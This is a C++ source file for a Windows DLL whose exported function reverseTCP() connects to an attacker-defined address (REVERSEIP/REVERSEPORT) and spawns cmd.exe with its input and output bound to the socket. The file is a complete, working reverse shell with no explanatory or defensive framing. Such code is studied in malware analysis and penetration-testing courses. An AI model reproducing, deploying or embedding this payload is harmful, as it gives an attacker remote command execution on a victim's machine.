// reverse_tcp.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"


// cc.cpp : Defines the exported functions for the DLL application.
//

#include "reverse_tcp.h"

#pragma comment(lib,"ws2_32")
#pragma warning(disable:4996)

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

__declspec(dllexport) BOOL reverseTCP()
{
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	Winsock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(REVERSEPORT);
	hax.sin_addr.s_addr = inet_addr(REVERSEIP);

	WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&ini_processo, 0, sizeof(ini_processo));
	ini_processo.cb = sizeof(ini_processo);
	ini_processo.dwFlags = STARTF_USESTDHANDLES;
	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;



	CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
	return TRUE;
}